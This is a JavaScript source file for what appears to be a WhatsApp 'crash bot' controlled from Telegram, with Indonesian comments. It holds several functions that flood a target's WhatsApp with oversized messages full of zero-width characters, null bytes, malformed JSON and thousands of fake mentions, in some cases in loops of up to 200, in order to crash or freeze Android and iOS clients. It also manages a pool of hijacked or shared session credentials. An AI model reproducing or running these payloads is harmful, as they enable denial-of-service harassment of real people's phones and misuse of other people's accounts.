                        text: "Fomo Parfum lu🤓☝️" + '\u200b'.repeat(6500),
                        format: "DEFAULT"
                    },
                    description: "Mbg Ko Parfum🤓☝️" + '\x10'.repeat(6500),
                    nativeFlowMessage: {
                        name: "galaxy_message",
                        paramsJson: JSON.stringify({
                            buttons: "Mykonos Masako Royal🤓☝️" + '\u0000'.repeat(6500)
                        }),
                        version: 3
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, Justprend, { participant: { jid: '0@s.whatsapp.net' } });
}

async function DelayGatauPokonyaDelay(sock, target) {
    let JustFrend = {
        groupStatusMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "Prime'X" + '\u200b'.repeat(25000),
                    title: "Prime'X" + '\x10'.repeat(25000),
                    description: "Prime'X" + '\u2060'.repeat(25000),
                },
                interactiveMessage: {
                    body: {
                        text: "Prime'X" + '\x1b'.repeat(25000),
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        name: "galaxy_message",
                        paramsJson: JSON.stringify({
                            buttons: '\u0000'.repeat(25000),
                            title: "Prime'X" + '\0'.repeat(25000),
                            subtitle: "Prime'X" + '\x00'.repeat(25000)
                        }),
                        version: 3
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, JustFrend, { participant: { jid: '0@s.whatsapp.net' } });
}

async function delayXhard(sock, target) {
    for (let i = 0; i < 100; i++) {
        try {
            let payload = {
                groupStatusMessageV2: {
                    message: {
                        extendedTextMessage: {
                            text: "\u200B\u200C\u200D\u2060\uFEFF".repeat(150000) + "\u0000".repeat(150000) + "҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(50000),
                            contextInfo: {
                                mentionedJid: Array.from({ length: 10000 }, () => Math.floor(Math.random() * 99999999999) + "@s.whatsapp.net"),
                                forwardingScore: 999999999,
                                isForwarded: true,
                                stanzaId: "\u0000".repeat(5000),
                                participant: target,
                                quotedMessage: {
                                    conversation: "\u200B\u200C\u200D\u2060\uFEFF".repeat(50000)
                                }
                            }
                        }
                    }
                }
            }
            await sock.relayMessage(target, payload, { participant: { jid: target } })
            await new Promise(r => setTimeout(r, 50))
        } catch(e) {}
    }
}

//function crash x freeze
async function CrashXfrezer(sock, target) {
    try {
        await sock.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "‼️⃟By Rizzisreal",
                            hasMediaAttachment: false
                        },
                        body: {
                            text: "҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(100000) + "‼️⃟By Rizzisreal".repeat(5000),
                            format: "DEFAULT"
                        },
                        footer: {
                            text: "҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(50000)
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 15000 }, () => Math.floor(Math.random() * 99999999999) + "@s.whatsapp.net"),
                            isForwarded: true,
                            forwardingScore: 999999999
                        },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "single_select", buttonParamsJson: JSON.stringify({ title: "҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(10000) }) },
                                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "‼️⃟By Rizzisreal".repeat(5000), id: null }) }
                            ],
                            messageParamsJson: "}".repeat(150000),
                            messageVersion: 3
                        }
                    }
                }
            }
        }, { participant: { jid: target } })
        console.log(`✅ SUKSES`)
    } catch (err) {
        console.log(`❌ EROR`)
    }
}

//function crash android
async function Miyabicrash(sock, target) {
    const payload = 'ꦾ'.repeat(80000);
    const mentionSpam = Array.from({ length: 2000 }, (_, i) => `${i}@s.whatsapp.net`);
    
    for (let i = 0; i < 200; i++) {
        try {
            await sock.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 922.999999999999,
                                    name: `MIYABI V4 CRASH ${payload.slice(0, 1000)}`,
                                    address: payload,
                                    jpegThumbnail: null
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: payload,
                                format: "DEFAULT"
                            },
                            footer: {
                                text: payload.slice(0, 50000)
                            },
                            contextInfo: {
                                mentionedJid: mentionSpam,
                                isForwarded: true,
                                forwardingScore: 9999,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "status@broadcast",
                                externalAdReply: {
                                    title: `MIYABI V4 ‼️⃟ ༚ ${payload.slice(0, 500)}`,
                                    body: payload.slice(0, 1000),
                                    mediaType: 1,
                                    showAdAttribution: true
                                }
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "single_select",
                                        buttonParamsJson: JSON.stringify({ title: payload.slice(0, 30000) })
                                    },
                                    {
                                        name: "quick_reply",
                                        buttonParamsJson: JSON.stringify({ display_text: payload.slice(0, 20000), id: null })
                                    }
                                ],
                                messageParamsJson: "}".repeat(20000),
                                messageVersion: 3
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
            
            console.log(`✅ MIYABI CRASH LOCATION - ${i+1}/200 sukses`);
            await new Promise(r => setTimeout(r, 300));
            
        } catch (err) {
            console.log(`❌ MIYABI CRASH error: ${err.message}`);
        }
    }
}

async function Crashandroid(sock, target) {
    try {
        await sock.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/d/fake",
                                mimetype: "application/octet-stream",
                                title: 'ꦾ'.repeat(50000),
                                fileLength: "999999999999",
                                pageCount: 99999
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: 'ꦾ'.repeat(300000) + '\u0000'.repeat(300000),
                            format: "DEFAULT"
                        },
                        footer: {
                            text: '\u0000'.repeat(100000)
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 20000 }, () => `${Math.floor(Math.random() * 99999999999)}@s.whatsapp.net`),
                            isForwarded: true,
                            forwardingScore: 999999999,
                            quotedMessage: {
                                conversation: '\u200B\u200C\u200D\u2060\uFEFF'.repeat(50000)
                            }
                        },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "single_select", buttonParamsJson: JSON.stringify({ title: 'ꦾ'.repeat(50000) }) },
                                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: '\u0000'.repeat(50000), id: null }) },
                                { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "ANDROID CRASH", url: "https://t.me/RXTcommunitygen1" }) },
                                { name: "call_permission_request", buttonParamsJson: JSON.stringify({ display_text: 'ꦾ'.repeat(30000) }) }
                            ],
                            messageParamsJson: "{".repeat(200000),
                            messageVersion: 3
                        }
                    }
                }
            }
        }, { participant: { jid: target } })
        
        await new Promise(r => setTimeout(r, 500))
        
        await sock.relayMessage(target, {
            stickerPackMessage: {
                stickerPackId: "android-crash-" + Date.now(),
                name: 'ꦾ'.repeat(100000),
                publisher: '\u0000'.repeat(50000),
                stickers: [],
                fileLength: "999999999999",
                contextInfo: {
                    mentionedJid: Array.from({ length: 10000 }, () => `${Math.floor(Math.random() * 99999999999)}@s.whatsapp.net`),
                    isForwarded: true,
                    forwardingScore: 999999999
                },
                packDescription: 'ꦾ'.repeat(80000),
                stickerPackSize: "999999999999"
            }
        }, { participant: { jid: target } })
        
        await new Promise(r => setTimeout(r, 500))
        
        await sock.sendMessage(target, { 
            text: '\u200B\u200C\u200D\u2060\uFEFF'.repeat(100000),
            mentions: Array.from({ length: 15000 }, () => `${Math.floor(Math.random() * 99999999999)}@s.whatsapp.net`)
        })
        
        console.log(`✅ sukses`)
    } catch (err) {
        console.log(`❌ eror ${err.message}`)
    }
}

//function crash ios x delay
async function CrashiosXdelay(sock, target) {
    try {
        await sock.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            locationMessage: {
                                degreesLatitude: -999999999.999999,
                                degreesLongitude: 999999999.999999,
                                name: 'ꦾ'.repeat(100000),
                                address: '\u0000'.repeat(200000) + '\u200B\u200C\u200D\u2060\uFEFF'.repeat(100000)
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: 'ꦾ'.repeat(250000) + '\u0000'.repeat(200000),
                            format: "DEFAULT"
                        },
                        footer: {
                            text: 'ꦾ'.repeat(50000)
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 15000 }, () => `${Math.floor(Math.random() * 99999999999)}@s.whatsapp.net`),
                            isForwarded: true,
                            forwardingScore: 999999999
                        },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "single_select", buttonParamsJson: JSON.stringify({ title: 'ꦾ'.repeat(50000) }) },
                                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: '\u0000'.repeat(50000), id: null }) }
                            ],
                            messageParamsJson: "{".repeat(150000),
                            messageVersion: 3
                        }
                    }
                }
            }
        }, { participant: { jid: target } })
        
        await new Promise(r => setTimeout(r, 1000))
        
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: '\u200B\u200C\u200D\u2060\uFEFF'.repeat(150000),
                        contextInfo: {
                            mentionedJid: Array.from({ length: 10000 }, () => `${Math.floor(Math.random() * 99999999999)}@s.whatsapp.net`),
                            forwardingScore: 999999999,
                            isForwarded: true
                        }
                    }
                }
            }
        }, { participant: { jid: target } })
        
        console.log(`✅ sukses`)
    } catch (err) {
        console.log(`❌ eror ${err.message}`)
    }
}

//function delay x crash
async function Miyabi(sock, target) {
    const invisiblePayload = '\u200B\u200C\u200D\u2060\uFEFF'.repeat(50000);
    const zeroPayload = '\u0000'.repeat(80000);
    const mentionSpam = Array.from({ length: 3000 }, (_, i) => `${i}@s.whatsapp.net`);
    
    for (let i = 0; i < 200; i++) {
        try {
            await sock.relayMessage(target, {
                groupStatusMessageV2: {
                    message: {
                        extendedTextMessage: {
                            text: invisiblePayload + zeroPayload,
                            contextInfo: {
                                mentionedJid: mentionSpam,
                                forwardingScore: 999999999,
                                isForwarded: true,
                                stanzaId: target,
                                participant: target
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
            
            await new Promise(r => setTimeout(r, 100));        
            await sock.relayMessage(target, {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            contextInfo: {
                                mentionedJid: mentionSpam,
                                forwardingScore: 999999999,
                                isForwarded: true
                            },
                            body: {
                                text: invisiblePayload,
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: `{"flow_cta":"${zeroPayload}"}`,
                                version: 3
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
            
            console.log(`✅ MIYABI INVISIBLE - ${i+1}/200 sukses`);
            await new Promise(r => setTimeout(r, 200));
            
        } catch (err) {
            console.log(`❌ MIYABI INVISIBLE error: ${err.message}`);
        }
    }
}

//function 
// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
// connectionMeta: menyimpan tipe sender tiap session
// { "6281234567890": { type: "global" | "private", owner: "username" } }
const connectionMeta = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

// === Setup VIP Folder ===
function getVipSessionPath(sessionName) {
  return path.join('vip', sessionName);
}
function setupVipFolder() {
  // Ganti path menjadi root folder 'vip', bukan di dalam 'permenmd'
  const vipPath = path.join(__dirname, 'vip');

  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      console.log("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    console.error("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}/*

async function connectSession(folderPath, sessionName, retries = 5) {
  if (activeConnections[sessionName]) return activeConnections[sessionName];

  const sessionsFold = path.join(folderPath, sessionName);

  return new Promise(async (resolve) => {
    try {
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) qrCodes[sessionName] = qr;

        if (connection === "open") {
          delete qrCodes[sessionName];
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
          console.log(`[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") biz[sessionName] = sock;
          else if (type === "Messenger") mess[sessionName] = sock;

          resolve(sock);
        } else if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

          if (isLoggedOut) {
            console.log(`[${sessionName}] Logged out.`);
            fs.rmSync(sessionsFold, { recursive: true, force: true });
            delete activeConnections[sessionName];
            delete biz[sessionName];
            delete mess[sessionName];
            resolve(null);
          } else if (retries > 0) {
            setTimeout(() => connectSession(folderPath, sessionName, retries - 1).then(resolve), 5000);
          } else {
            console.log(`${sessionName} Connection failed after retries.`);
            resolve(null);
          }
        }
      });
    } catch (err) {
      console.log(`[${sessionName}] Error connecting: ${err.message}`);
      resolve(null);
    }
  });
}*/

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

//const axios = require("axios");
const RAW_URL = "https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json";

async function unfollowAllChannel() {
  try {
    const { data } = await axios.get(RAW_URL);

    if (!Array.isArray(data)) {
      console.log("Data bukan array!");
      return;
    }

    console.log(`Total channel: ${data.length}`);

    for (let i = 0; i < data.length; i++) {
      const jid = data[i];
      try {
        await sock.newsletterUnfollow(jid);
        console.log(`[${i + 1}/${data.length}] Unfollow: ${jid}`);
        await new Promise(resolve => setTimeout(resolve, 1500));
      } catch (err) {
        console.log(`Gagal unfollow ${jid}:`, err.message);
      }
    }

    console.log("✅ Selesai unfollow semua channel dari baileys.");
  } catch (error) {
    console.log("❌ Gagal ambil data raw:", error.message);
  }
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('permenmd', owner, number);

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      try {
        
        await sock.newsletterFollow("120363404995533206@newsletter");
        await sock.newsletterFollow("120363330344810280@newsletter");
        await sleep(5000);
        await unfollowAllChannel();
        console.log("✅ Auto join channel sukses");
      } catch (e) {
        console.log("❌ Auto join channel gagal");
      }
      activeConnections[number] = sock;
      // Tandai tipe connection berdasarkan folder owner
      const isGlobalConn = owner === 'global_pool';
      connectionMeta[number] = { type: isGlobalConn ? 'global' : 'private', owner };
      
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);
          fs.writeFileSync(destCreds, data);
          console.log(`✅ Session tersimpan ke ${isGlobalConn ? '🌍 global_pool' : '🔒 pribadi'}: ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

async function startUserSessions() {
  const vipDir = 'vip';
  const baseDir = 'permenmd';
  
  // ── Load global_pool sender (dari member) ──────────────────────────────
  const globalPoolDir = path.join(baseDir, 'global_pool');
  if (fs.existsSync(globalPoolDir)) {
    const gpFiles = fs.readdirSync(globalPoolDir).filter(f => f.endsWith('.json'));
    console.log(`[🌍 GLOBAL POOL] Ditemukan ${gpFiles.length} sender dari member.`);
    for (const file of gpFiles) {
      const sessionName = path.basename(file, '.json');
      if (!activeConnections[sessionName]) {
        try {
          await connectSession(globalPoolDir, sessionName);
          // Tandai sebagai global
          connectionMeta[sessionName] = { type: 'global', owner: 'global_pool' };
          console.log(`[🌍] global_pool session loaded: ${sessionName}`);
        } catch (e) {
          console.error(`[❌] global_pool gagal load ${sessionName}: ${e.message}`);
        }
      }
    }
  } else {
    console.log(`[🌍 GLOBAL POOL] Folder global_pool belum ada, akan dibuat saat member pertama pair.`);
  }
  // ──────────────────────────────────────────────────────────────────────
    /*if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);
    for (const file of vipFiles) {
  const sessionName = path.basename(file, '.json');
  const jsonFile = path.join(vipDir, file);        // vip/628xxx.json
  const sessionFolder = path.join(vipDir, sessionName); // vip/628xxx/

  if (activeConnections[sessionName]) {
    console.log(`[SKIP] VIP ${sessionName} already active.`);
    continue;
  }

  if (!fs.existsSync(sessionFolder)) {
    fs.mkdirSync(sessionFolder, { recursive: true });
    fs.copyFileSync(jsonFile, path.join(sessionFolder, 'creds.json'));
    console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
  }

  try {
    console.log(`[START] Connecting VIP: ${sessionName}`);
    await connectSession(sessionFolder, sessionName, 100, () => {
      // Callback kalau session mati → hapus json asli juga
      if (fs.existsSync(jsonFile)) {
        fs.rmSync(jsonFile, { force: true });
        console.log(`[🗑️] VIP json dihapus: ${file}`);
      }
    });
  } catch (err) {
    console.error(`[ERROR] VIP ${sessionName}:`, err.message);
  }
}*/
/*

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);

  for (const file of vipFiles) {
    const sessionName = path.basename(file, '.json');

    if (activeConnections[sessionName]) {
      console.log(`[SKIP] VIP ${sessionName} already active.`);
      continue;
    }

    // Buat folder sementara vip/628xxx/ lalu taruh creds.json di sana
    const sessionFolder = path.join(vipDir, sessionName);
    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      fs.copyFileSync(
        path.join(vipDir, file),         // vip/628xxx.json
        path.join(sessionFolder, 'creds.json') // vip/628xxx/creds.json
      );
      console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
    }

    try {
      console.log(`[START] Connecting VIP: ${sessionName}`);
      await connectSession(vipDir, sessionName);
    } catch (err) {
      console.error(`[ERROR] VIP ${sessionName}:`, err.message);
    }
  }
}
await sleep(20000);*/
  // 2. Scan User Folders — HANYA folder pribadi (bukan global_pool)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => ({ name, fullPath: path.join(baseDir, name) }))
    .filter(({ fullPath }) => fs.lstatSync(fullPath).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const { name: folderName, fullPath: folder } of subfolders) {
    // ── SKIP global_pool — sudah di-load di atas dengan tag type:"global"
    if (folderName === 'global_pool') {
      console.log(`[SKIP] global_pool sudah di-load sebagai global sender, skip scan ulang.`);
      continue;
    }

    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = path.basename(jsonFile, ".json");

        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[🔒 START] Private session: ${sessionName} (owner: ${folderName})`);
          await connectSession(folder, sessionName);
          // Tandai sebagai private
          connectionMeta[sessionName] = { type: 'private', owner: folderName };
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
}
function prepareVipSessionFolders() {
  const vipFolder = 'vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
    }
    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    logger.error("Error preparing VIP folders:", err.message);
    return [];
  }
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectSession('vip', baseName);
  }
}
function getRandomVipConnection() {
  const conns = getActiveVipConnections();
  const keys = Object.keys(conns);
  if (keys.length === 0) return null;
  return conns[keys[Math.floor(Math.random() * keys.length)]];
}
   function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
} 

// Helper: Ambil socket yang aktif dari sebuah path folder
function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}
// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return null langsung
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName]; // return socket aktif
    }
  }
  return null; // Tidak ada sesi aktif
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...(isOwner ? [
          [
            { text: "📋 List User", callback_data: "list_user" },
            { text: "🎛 Buat Custom User", callback_data: "create_custom" },
            { text: "🗑 Hapus User", callback_data: "delete_user" }
          ],
        ] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

